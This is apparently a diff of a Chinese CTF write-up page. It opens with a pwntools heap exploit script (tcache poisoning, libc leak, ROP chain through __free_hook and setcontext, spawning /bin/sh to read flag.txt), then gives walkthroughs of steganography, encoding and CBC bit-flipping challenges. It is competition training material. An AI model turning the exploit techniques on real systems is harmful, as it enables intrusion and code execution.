-edit(2,&#39;\x16&#39; * 0x28 + &quot;\n&quot;,&#39;a&#39; * 0x28 + p64(0x31) + p64(heap_base + 0x010) + &quot;\n&quot;)
-add(0x28,0x28)
-add(0x28,0x38)
-edit(4,p64(0x0800000000000000) + &quot;\n&quot;,p64(0xcafecafecafecafe) + &quot;\n&quot;)
-add(0x38,0x38)
-add(0x38,0x38)
-edit(5,&#39;\x15&#39; * 0x38 + p8(0x91),&#39;\x16&#39; * 0x18 + &#39;\n&#39;)
-edit(6,&#39;\n&#39;,p64(0) + p64(0x31) + &quot;\n&quot;)
-free(5)
-add(0x38,0x38)
+ru(<span class="hljs-string">&quot;secret:&quot;</span>)
+dir_fd = int(ru(<span class="hljs-string">&quot;\n&quot;</span>).strip(),<span class="hljs-number">10</span>)
+add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x28</span>)
+add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x28</span>)
+edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x16&#x27;</span> * <span class="hljs-number">0x28</span> + p8(<span class="hljs-number">0x51</span>),<span class="hljs-string">&quot;\n&quot;</span>)
+free(<span class="hljs-number">2</span>)
+add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x48</span>)
+free(<span class="hljs-number">3</span>)
+edit(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x16&#x27;</span> * <span class="hljs-number">0x28</span> + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x31</span>) + p64(heap_base + <span class="hljs-number">0x010</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
+add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x28</span>)
+add(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x38</span>)
+edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0800000000000000</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafecafecafe</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
+edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;\x15&#x27;</span> * <span class="hljs-number">0x38</span> + p8(<span class="hljs-number">0x91</span>),<span class="hljs-string">&#x27;\x16&#x27;</span> * <span class="hljs-number">0x18</span> + <span class="hljs-string">&#x27;\n&#x27;</span>)
+edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x31</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
+free(<span class="hljs-number">5</span>)
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
 show()
-ru(&quot;Item idx: 5&quot;)
-ru(&quot;description: &quot;)
-main_arena &#x3D; uu64(r(6)) - 224
-libc &#x3D; main_arena - 0x10 - lib.symbols[b&#39;__malloc_hook&#39;]
-lib.address &#x3D; libc
-system &#x3D; lib.symbols[b&#39;system&#39;]
-binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()
-__free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]
-__malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]
-pop_rdi_ret &#x3D; libc + 0x000000000002155f
-pop_rsi_ret &#x3D; libc + 0x0000000000023e8a
-pop_rdx_ret &#x3D; libc + 0x0000000000001b96
-pop_rdx_rsi_ret &#x3D; libc + 0x0000000000130889
-ret &#x3D; libc + 0x00000000000008aa
-add(0x38,0x38)
-free(6)
-edit(7,p64(heap_base + 0x60) + &quot;\n&quot;,p64(0xcafecafecafecafe) * 4 + p64(0x3c0 + heap_base) + p64(ret) + &quot;\n&quot;)
-add(0x38,0x48)
-add(0x38,0x48)
-edit(8,p64(0xdeadbeefdeadbeef) + &quot;\n&quot;,p64(lib.sym[&#39;__free_hook&#39;]) + &quot;\n&quot;)
-edit(4,p64(0x0800000000010000) + &quot;\n&quot;,p64(0xcafecafecafecafe) + &quot;\n&quot;)
-add(0x38,0x48)
-edit(9,p64(lib.sym[&#39;setcontext&#39;] + 53) + &quot;\n&quot;,&#39;\n&#39;)
-edit(5,p64(pop_rdi_ret) + p64(0) + p64(pop_rdx_rsi_ret) + p64(0x1000)+ p64(heap_base + 0x3b0) + p64(lib.sym[&#39;read&#39;])+&quot;\n&quot;,&#39;\n&#39;)
-free(7)
-payload &#x3D; &#39;a&#39; * 64
-payload +&#x3D; p64(pop_rdi_ret) + p64(dir_fd)
-payload +&#x3D; p64(lib.sym[&#39;fchdir&#39;])
-payload +&#x3D; p64(pop_rdi_ret) + p64(binsh)
-payload +&#x3D; p64(ret)
-payload +&#x3D; p64(system)
+ru(<span class="hljs-string">&quot;Item idx: 5&quot;</span>)
+ru(<span class="hljs-string">&quot;description: &quot;</span>)
+main_arena = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">224</span>
+libc = main_arena - <span class="hljs-number">0x10</span> - lib.symbols[<span class="hljs-string">b&#x27;__malloc_hook&#x27;</span>]
+lib.address = libc
+system = lib.symbols[<span class="hljs-string">b&#x27;system&#x27;</span>]
+binsh = lib.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>).next()
+__free_hook = lib.symbols[<span class="hljs-string">b&#x27;__free_hook&#x27;</span>]
+__malloc_hook = lib.symbols[<span class="hljs-string">b&#x27;__malloc_hook&#x27;</span>]
+pop_rdi_ret = libc + <span class="hljs-number">0x000000000002155f</span>
+pop_rsi_ret = libc + <span class="hljs-number">0x0000000000023e8a</span>
+pop_rdx_ret = libc + <span class="hljs-number">0x0000000000001b96</span>
+pop_rdx_rsi_ret = libc + <span class="hljs-number">0x0000000000130889</span>
+ret = libc + <span class="hljs-number">0x00000000000008aa</span>
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x38</span>)
+free(<span class="hljs-number">6</span>)
+edit(<span class="hljs-number">7</span>,p64(heap_base + <span class="hljs-number">0x60</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafecafecafe</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x3c0</span> + heap_base) + p64(ret) + <span class="hljs-string">&quot;\n&quot;</span>)
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x48</span>)
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x48</span>)
+edit(<span class="hljs-number">8</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(lib.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) + <span class="hljs-string">&quot;\n&quot;</span>)
+edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0800000000010000</span>) + <span class="hljs-string">&quot;\n&quot;</span>,p64(<span class="hljs-number">0xcafecafecafecafe</span>) + <span class="hljs-string">&quot;\n&quot;</span>)
+add(<span class="hljs-number">0x38</span>,<span class="hljs-number">0x48</span>)
+edit(<span class="hljs-number">9</span>,p64(lib.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span>) + <span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)
+edit(<span class="hljs-number">5</span>,p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdx_rsi_ret) + p64(<span class="hljs-number">0x1000</span>)+ p64(heap_base + <span class="hljs-number">0x3b0</span>) + p64(lib.sym[<span class="hljs-string">&#x27;read&#x27;</span>])+<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)
+free(<span class="hljs-number">7</span>)
+payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">64</span>
+payload += p64(pop_rdi_ret) + p64(dir_fd)
+payload += p64(lib.sym[<span class="hljs-string">&#x27;fchdir&#x27;</span>])
+payload += p64(pop_rdi_ret) + p64(binsh)
+payload += p64(ret)
+payload += p64(system)
 sl(payload)
-sleep(0.5)
-sl(&quot;echo deadbeef &amp;&amp; cd ..&#x2F; &amp;&amp; cat flag.txt&quot;)
-ru(&quot;deadbeef&quot;)
+sleep(<span class="hljs-number">0.5</span>)
+sl(<span class="hljs-string">&quot;echo deadbeef &amp;&amp; cd ../ &amp;&amp; cat flag.txt&quot;</span>)
+ru(<span class="hljs-string">&quot;deadbeef&quot;</span>)
 irt()
-def CTF_exploit(argv):
-global remote_ip,remote_port,binary_file
-argv_len &#x3D; len(argv)
-context.log_level &#x3D; b&quot;DEBUG&quot;
-context.binary &#x3D; binary_file
-if argv_len &#x3D;&#x3D; 1:
-sh &#x3D; process(binary_file)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">CTF_exploit</span>(<span class="hljs-params">argv</span>):</span>
+<span class="hljs-keyword">global</span> remote_ip,remote_port,binary_file
+argv_len = len(argv)
+context.log_level = <span class="hljs-string">b&quot;DEBUG&quot;</span>
+context.binary = binary_file
+<span class="hljs-keyword">if</span> argv_len == <span class="hljs-number">1</span>:
+sh = process(binary_file)
 exploit(sh)
-return
-elif argv_len &#x3D;&#x3D; 3:
-sh &#x3D; remote(argv[1],argv[2])
-exploit(sh,remote &#x3D; True)
-return
-else:
-sh &#x3D; process(binary_file)
+<span class="hljs-keyword">return</span>
+<span class="hljs-keyword">elif</span> argv_len == <span class="hljs-number">3</span>:
+sh = remote(argv[<span class="hljs-number">1</span>],argv[<span class="hljs-number">2</span>])
+exploit(sh,remote = <span class="hljs-literal">True</span>)
+<span class="hljs-keyword">return</span>
+<span class="hljs-keyword">else</span>:
+sh = process(binary_file)
 exploit(sh)
-if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">b&quot;__main__&quot;</span>:
 CTF_exploit(sys.argv)</code></pre>
 
 <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="耗子尾汁"><a href="#耗子尾汁" class="headerlink" title="耗子尾汁"></a>耗子尾汁</h2><h3 id="1-2-9M的gif图"><a href="#1-2-9M的gif图" class="headerlink" title="1. 2.9M的gif图"></a>1. 2.9M的gif图</h3><p>binwalk分离后得到2^4_2^5_2^6.mp4，flag.txt</p>
-<p><img src="https://uploader.shimo.im/f/LZKCfwlRSbvKxI6T.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//LZKCfwlRSbvKxI6T.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>其中flag.txt当然是假的</p>
 <h3 id="2-2-4-2-5-2-6-mp4"><a href="#2-2-4-2-5-2-6-mp4" class="headerlink" title="2. 2^4_2^5_2^6.mp4"></a>2. 2^4_2^5_2^6.mp4</h3><p>再次binwalk分离得到有密码的压缩包</p>
-<p><img src="https://uploader.shimo.im/f/yBicI6a1ZmX8MJLc.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//yBicI6a1ZmX8MJLc.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>但没有提示密码相关信息，爆破可能性不大，所以逐帧看mp4文件得到c2lnbl9pbg==</p>
-<p><img src="https://uploader.shimo.im/f/XjRtB1gtTXkELpny.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//XjRtB1gtTXkELpny.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>base64解码后得到”sign_in”即为压缩包密码</p>
 <h3 id="3-19-20-txt"><a href="#3-19-20-txt" class="headerlink" title="3. 19_20.txt"></a>3. 19_20.txt</h3><p>解压后看到一长串字符串  拿去解base64后还是一长串奇奇怪怪的东西</p>
-<p><img src="https://uploader.shimo.im/f/Lirv8Y77Ismw2DQA.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/Lirv8Y77Ismw2DQA__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>想到mp4文件的名字很奇怪”2^4_2^5_2^6”  可以猜到base64，base32，base16依次解开后即为txt文件内提示的最后一层单表替换密码</p>
 <p>txt文件的名字”19_20” 为仿射加密的两个参数a，b的值，解开即为flag字符串</p>
-<p><img src="https://uploader.shimo.im/f/K4UjMPzcGS6X4q5g.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/K4UjMPzcGS6X4q5g__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>按题目要求的格式改为 flag{you_have_signed_in_successfully} 即可</p>
 <p>弱弱说一句，这道题的提示全在<strong>文件名</strong></p>
 <p>2^4_2^5_2^6对应base16.32.64编码，19_20对应仿射的两个参数</p>
 <p>然后可以解得flag</p>
-<h2 id="找找吧"><a href="#找找吧" class="headerlink" title="找找吧"></a><strong>找找吧</strong></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>下载附件是一个压缩包，解压发现需要密码，把压缩包拖到十六进制查看器里，最后有解压密码，解压后有两个文件，一个MP3文件，一个压缩包，压缩包有密码，所以只能检测MP3文</p>
-<p>件。</p>
-<p><img src="https://uploader.shimo.im/f/CbeKRwZJv543H54n.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<h2 id="找找吧"><a href="#找找吧" class="headerlink" title="找找吧"></a><strong>找找吧</strong></h2><p>下载附件是一个压缩包，解压发现需要密码，把压缩包拖到十六进制查看器里，最后有解压密码，解压后有两个文件，一个MP3文件，一个压缩包，压缩包有密码，所以只能检测MP3文件。</p>
+<p><img src="http://cdn.jev0n.com//CbeKRwZJv543H54n.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>MP3文件可以正常播放，也可能用一些播放器无法播放，会显示一张图片，直接将mp3文件放入audacity中会导致无法正常加载，因此将MP3文件放入十六进制查看器，由文件头可以看出是rar文件，将后缀名改为rar，解压，（如果是adobe的audacity不需要这一步）得到一张图片和一个MP3文件。图片里写明没用，所以不管图片，MP3文件播放，是首看似很正常的歌，但是如果将进度条拖到最后会发现有不正常的声音，用audacity打开，发现音频最后有不正常的音频。</p>
-<p><img src="https://uploader.shimo.im/f/VgUicY4u4i86Ehb6.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//VgUicY4u4i86Ehb6.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>放大后发现可能是摩斯密码，解密后得到字符串，去解压缩包，发现密码错误，观察字符串格式，可能是md5，解密后得到真密码，解压压缩包，得到一个gif文件和hint.png文件，gif文件可以看到一个字符串，可以用各种工具逐帧查看</p>
-<p><img src="https://uploader.shimo.im/f/JHj3Yvw6guczdhtw.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//JHj3Yvw6guczdhtw.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>png文件很明显少了底下的一部分，在十六进制查看器中更改图片高度，具体更改位数百度，后得到提示Veni,vidi,vici,</p>
-<p><img src="https://uploader.shimo.im/f/xTEbvXqhMaxLxhw5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//xTEbvXqhMaxLxhw5.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>百度发现这是凯撒大帝的名言，因此得知是凯撒密码加密，而位移的位数等于加密后的flag在gif中的帧数即九位，也可以一位一位试出来，最终得到flag。</p>
 <h2 id="来猜谜了"><a href="#来猜谜了" class="headerlink" title="来猜谜了"></a>来猜谜了</h2><p>压缩包打开后是一个 png 图片</p>
-<p><img src="https://uploader.shimo.im/f/LfQezP9Ity1hMZtS.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//LfQezP9Ity1hMZtS.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>关键信息：老色批，首字母是lsp，应该可以联想到lsb隐写，用stegslove将数据提取出来。</p>
-<p><img src="https://uploader.shimo.im/f/VK0zoxrYvfYiNikU.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/VK0zoxrYvfYiNikU__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>从文件头可以看出隐写进去的是zip文件，直接保存为zip就行了。不过也有师傅是直接用binwalk分离出来，然后将文件修补好的。</p>
-<p><img src="https://uploader.shimo.im/f/4snkonIWULh60DF5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/4snkonIWULh60DF5__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>分离出的压缩包打开后有一个 mi.jpg 和一个流量数据包。</p>
-<p><img src="https://uploader.shimo.im/f/l2YJ4gt5p4jfKYf1.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/l2YJ4gt5p4jfKYf1__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>用wireshark打开流量包可以看到是usb协议，且leftover capture data域的数据长度为八个字节，所以可以判断出是键盘流量包。在kali中用tshark命令将leftover capture data域的数据提取出来。</p>
-<p><img src="https://uploader.shimo.im/f/KrN0dkxTGBAQT1Fz.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/dj736PeK6172ZiuO.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/KrN0dkxTGBAQT1Fz__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/dj736PeK6172ZiuO__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>然后就可以直接用键盘流量分析的脚本把敲击了哪些键分析出来，网上这种脚本很多，我就这不发了，嘿嘿。</p>
-<p><img src="https://uploader.shimo.im/f/x7NRizqekrUWHZCA.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/x7NRizqekrUWHZCA__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>得到的字符串是：AG DX AG DX AG DX</p>
 <p>这是一串用ADFGX编码方式加密的字符串</p>
-<p><img src="https://uploader.shimo.im/f/F5MONqpWR7qNt9GJ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/F5MONqpWR7qNt9GJ__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <p>通过对照表就可以得到明文: gogogo</p>
 <p>然后就剩mi.jpg了，flag是隐写在mi.jpg中的，隐写方式是outguess隐写，gogogo就是密钥。其实题目名和题目说明都有猜，这就是在提示隐写方式。直接用工具把flag分离出来就行了</p>
-<p><img src="https://uploader.shimo.im/f/VDhocWMekyTrTrYl.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
-<p><img src="https://uploader.shimo.im/f/jPi6VXXUoeRWzgnj.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/VDhocWMekyTrTrYl__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="https://images-cdn.shimo.im/jPi6VXXUoeRWzgnj__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
 <h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a><strong>套娃</strong></h2><p>我的题确实简单队友把我想出得先出了，没法知识点不可能重复把。唉挺难受得把想在bash里去藏key得结果有得比赛先出了。唉我背锅把出简单</p>
 <p>一个xlsx文件，直接改后缀为zip,解压得到一个xlsx和一个RC4data.txt,</p>
 <p>xlsx文件在改后缀为zip解压得一个xlsx文件和一个加密得zip文件</p>
@@ -1260,7 +1293,7 @@ print(binascii.unhexlify(hex(m)[2:].strip(&quot;L&quot;)))</code></pre>
 <h2 id="Yusa的密码学课堂—CBC第一课"><a href="#Yusa的密码学课堂—CBC第一课" class="headerlink" title="Yusa的密码学课堂—CBC第一课"></a><strong>Yusa的密码学课堂—CBC第一课</strong></h2><ol>
 <li>这一题的考点是CBC的字节翻转，需要对CBC模式具有一定了解</li>
 </ol>
-<p><img src="https://uploader.shimo.im/f/WVFDhwOTXIBjatXj.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" srcset="/img/loading.gif" alt="图片"></p>
+<p><img src="http://cdn.jev0n.com//WVFDhwOTXIBjatXj.png!thumbnail" srcset="/img/loading.gif" alt="图片"></p>
 <p>可见在解密时是先进行AES解密，随后异或iv(或者前一组密文)才得到明文。</p>
 <ol start="2">
 <li>在这一题中，我们的用户名在二组（除去iv），所以在第二次交互我们修改第一组密文的对应字节，就可以让用户名对应的字节翻转。</li>
